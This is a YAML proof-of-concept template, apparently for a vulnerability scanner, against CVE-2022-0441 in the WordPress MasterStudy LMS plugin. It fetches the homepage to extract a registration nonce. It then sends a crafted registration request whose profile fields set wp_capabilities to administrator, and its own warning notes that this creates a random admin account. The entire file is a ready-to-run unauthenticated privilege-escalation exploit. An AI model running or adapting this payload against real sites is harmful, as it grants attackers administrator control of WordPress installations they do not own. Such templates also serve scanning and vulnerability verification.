name: poc-yaml-wordpress-masterstudy-lms-cve-2022-0441-unauth
manual: true
transport: http
set:
    username: randomLowercase(6)
    email: randomLowercase(6)
    password: string(randomInt(300, 5000)) + randomLowercase(5) + "A"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"stm_lms_register\":\"(?P<nonce>.+?)\",\"".submatch(response.body_string)'
            nonce: search["nonce"]
            host: request.url.host
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}}
            headers:
                Content-Type: application/json
                Origin: '{{host}}'
            body: '{"user_login":"{{username}}","user_email":"{{username}}@{{email}}.com","user_password":"{{password}}","user_password_re":"{{password}}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}'
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("\"message\":\"Registration completed successfully.\"") && response.body_string.contains("\"status\":\"success\"") && response.headers["Content-Type"].contains("application/json")
expression: r0() && r1()
detail:
    author: Editor
    links:
        - https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed
    vulnerability:
        id: CT-393867
        level: critical
    warning: this poc will create a random admin account
